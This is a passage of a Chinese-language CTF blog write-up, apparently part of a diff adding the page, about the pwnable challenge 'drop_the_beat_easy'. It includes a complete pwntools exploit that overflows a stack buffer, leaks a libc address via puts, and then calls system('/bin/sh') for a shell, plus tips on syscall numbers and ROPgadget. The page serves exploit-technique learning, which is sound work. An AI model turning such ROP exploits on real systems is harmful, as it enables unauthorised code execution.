 [--print-rpath]</span><br><span class="line">  [--force-rpath]</span><br><span class="line">  [--add-needed LIBRARY]</span><br><span class="line">  [--remove-needed LIBRARY]</span><br><span class="line">  [--replace-needed LIBRARY NEW_LIBRARY]</span><br><span class="line">  [--print-needed]</span><br><span class="line">  [--no-<span class="keyword">default</span>-lib]</span><br><span class="line">  [--debug]</span><br><span class="line">  [--version]</span><br><span class="line">  FILENAME</span><br></pre></td></tr></table></figure>
+
+<p>还有就是接受的问题，有时候接受可能会多一个或者少一个换行符，可以先用recv一次全部查看一下接受的内容</p>
+<p>最后最终的EXP就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./drop_the_beat_easy"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./drop_the_beat_easy'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048672")</span></span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(main)</span><br><span class="line"><span class="keyword">print</span> hex(puts_plt)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(main)+p32(libc_start_main_got)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Wow... That's AWESOME!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#info(p.recv())</span></span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">"system"</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(libc.symbols[<span class="string">"system"</span>])*<span class="number">2</span>+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>还有就是可以在 <code>/usr/include/asm/unistd_32.h</code>直接查看32位系统的系统调用号，配合<code>grep</code>效果更好</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ cat /usr/include/<span class="keyword">asm</span>/unistd_64.h | grep execve</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execveat 322</span></span><br></pre></td></tr></table></figure>
+
+<p>还有就是熟练使用ROPgadget生成ROP chain</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/10/30/how2heap▒╩╝╟0x01/" rel="next" title="how2heap笔记0x01">
+                  <i class="fa fa-chevron-left"></i> how2heap笔记0x01
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/11/12/SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈/" rel="prev" title="SUCTF2019-playfmt-printf的成链攻击">
+                  SUCTF2019-playfmt-printf的成链攻击 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
